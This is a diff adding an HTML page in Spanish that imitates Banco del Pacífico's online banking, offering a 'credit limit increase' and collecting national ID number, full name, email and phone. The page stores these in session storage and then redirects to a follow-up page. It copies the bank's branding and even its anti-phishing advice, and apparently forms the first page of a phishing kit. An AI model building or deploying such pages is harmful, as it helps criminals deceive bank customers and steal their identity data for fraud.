@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco del Pacífico</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',Arial,sans-serif;background:#eef1f5;min-height:100vh;display:flex;flex-direction:column}
+    header{background:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+    .logo-box{width:38px;height:38px;background:#1a56a0;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:900}
+    header span{font-size:1.1rem;font-weight:700;color:#1a3a6b}
+    .page{flex:1;display:flex;align-items:flex-start;justify-content:center;gap:32px;padding:36px 20px}
+    .card{background:#fff;border-radius:10px;padding:36px 32px;width:100%;max-width:440px;box-shadow:0 2px 12px rgba(0,0,0,.09)}
+    .card h2{font-size:1.45rem;font-weight:700;color:#1a3a6b;margin-bottom:26px;text-align:center}
+    .field{margin-bottom:20px}
+    .field label{display:block;font-size:.8rem;color:#777;margin-bottom:4px}
+    .field input{width:100%;border:none;border-bottom:2px solid #c5cdd8;padding:8px 2px;font-size:.97rem;color:#1a3a6b;background:transparent;outline:none;transition:border-color .2s}
+    .field input:focus{border-bottom-color:#1a56a0}
+    .field input.error-input{border-bottom-color:#e03131}
+    .err-msg{color:#e03131;font-size:.78rem;margin-top:4px;display:none}
+    .btn-primary{width:100%;background:#c7cdd6;color:#fff;border:none;border-radius:6px;padding:13px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:4px;transition:background .25s}
+    .btn-primary:hover{background:#1a56a0}
+    .footer-note{text-align:center;font-size:.7rem;color:#aaa;margin-top:22px;line-height:1.6}
+    .tips{max-width:320px;padding-top:8px}
+    .tip-title{font-size:.75rem;color:#999;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}
+    .tip-subtitle{font-size:.95rem;font-weight:700;color:#1a3a6b;margin-bottom:18px}
+    .tip-item{display:flex;gap:10px;margin-bottom:14px;align-items:flex-start}
+    .tip-icon{width:26px;height:26px;flex-shrink:0;background:#eef1f5;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px}
+    .tip-item p{font-size:.8rem;color:#777;line-height:1.45}
+    .help-section{margin-top:24px}
+    .help-section h4{font-size:.92rem;font-weight:700;color:#1a3a6b;margin-bottom:8px}
+    .help-section a{display:block;font-size:.8rem;color:#1a56a0;text-decoration:none;margin-bottom:5px}
+    @media(max-width:700px){.tips{display:none}.page{padding:16px 12px}.card{padding:26px 18px}}
+  </style>
+</head>
+<body>
+<header>
+  <div class="logo-box">B</div>
+  <span>Banco del Pacífico</span>
+</header>
+<div class="page">
+  <div class="card">
+    <h2>Solicitud de Aumento de Cupo</h2>
+    <div class="field">
+      <label>Número de cédula</label>
+      <input type="text" id="cedula" placeholder="Ej: 0912345678" inputmode="numeric" maxlength="13"/>
+      <div class="err-msg" id="err-cedula">Ingresa un número de cédula válido.</div>
+    </div>
+    <div class="field">
+      <label>Nombre completo</label>
+      <input type="text" id="nombre" placeholder="Como aparece en tu cédula"/>
+      <div class="err-msg" id="err-nombre">Ingresa tu nombre completo.</div>
+    </div>
+    <div class="field">
+      <label>Correo electrónico</label>
+      <input type="email" id="correo" placeholder="correo@ejemplo.com" inputmode="email"/>
+      <div class="err-msg" id="err-correo">Ingresa un correo válido.</div>
+    </div>
+    <div class="field">
+      <label>Número de teléfono</label>
+      <input type="tel" id="telefono" placeholder="09XXXXXXXX" inputmode="tel" maxlength="15"/>
+      <div class="err-msg" id="err-telefono">Ingresa un número de teléfono válido.</div>
+    </div>
+    <button class="btn-primary" onclick="continuar()">Continuar</button>
+    <p class="footer-note">Recomendamos utilizar la Banca Virtual con Chrome, Firefox o Edge.<br/>© Copyright 2017 Banco del Pacífico *V5.3.12b</p>
+  </div>
+  <div class="tips">
+    <p class="tip-title">CONSEJOS</p>
+    <p class="tip-subtitle">Por tu seguridad:</p>
+    <div class="tip-item"><div class="tip-icon">🔒</div><p>Banco del Pacífico S.A. no solicita claves, usuarios, números de tarjetas o cuenta por ningún medio.</p></div>
+    <div class="tip-item"><div class="tip-icon">🔑</div><p>No compartas tus claves, recuerda que son de uso personal e intransferible.</p></div>
+    <div class="tip-item"><div class="tip-icon">ℹ️</div><p>Para acceder a la Banca Virtual, asegúrese de teclear <strong>https://www.intermatico.com</strong></p></div>
+    <div class="tip-item"><div class="tip-icon">📞</div><p>En caso de recibir llamadas sospechosas contáctate al <strong>3731500 opción 9</strong>.</p></div>
+    <div class="help-section">
+      <h4>¿Necesitas ayuda?</h4>
+      <a href="#">• ¿Cómo creo mi usuario?</a>
+      <a href="#">• ¿Cómo desbloqueo mi usuario?</a>
+      <a href="#">• ¿Cómo recupero mi contraseña?</a>
+    </div>
+  </div>
+</div>
+<script>
+  function showError(id, msg){
+    const el=document.getElementById('err-'+id);
+    const inp=document.getElementById(id);
+    el.textContent=msg;el.style.display='block';
+    inp.classList.add('error-input');
+  }
+  function clearError(id){
+    document.getElementById('err-'+id).style.display='none';
+    document.getElementById(id).classList.remove('error-input');
+  }
+  ['cedula','nombre','correo','telefono'].forEach(id=>{
+    document.getElementById(id).addEventListener('input',()=>clearError(id));
+  });
+  function continuar(){
+    let ok=true;
+    const cedula=document.getElementById('cedula').value.trim();
+    const nombre=document.getElementById('nombre').value.trim();
+    const correo=document.getElementById('correo').value.trim();
+    const telefono=document.getElementById('telefono').value.trim();
+    if(!cedula||cedula.length<8){showError('cedula','Ingresa un número de cédula válido.');ok=false;}
+    if(!nombre||nombre.length<3){showError('nombre','Ingresa tu nombre completo.');ok=false;}
+    if(!correo||!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo)){showError('correo','Ingresa un correo válido.');ok=false;}
+    if(!telefono||telefono.length<7){showError('telefono','Ingresa un número de teléfono válido.');ok=false;}
+    if(!ok)return;
+    sessionStorage.setItem('bp_cedula',cedula);
+    sessionStorage.setItem('bp_nombre',nombre);
+    sessionStorage.setItem('bp_correo',correo);
+    sessionStorage.setItem('bp_telefono',telefono);
+    window.location.href='index1.html';
+  }
+  document.addEventListener('keydown',e=>{if(e.key==='Enter')continuar();});
+</script>
+</body>
+</html>
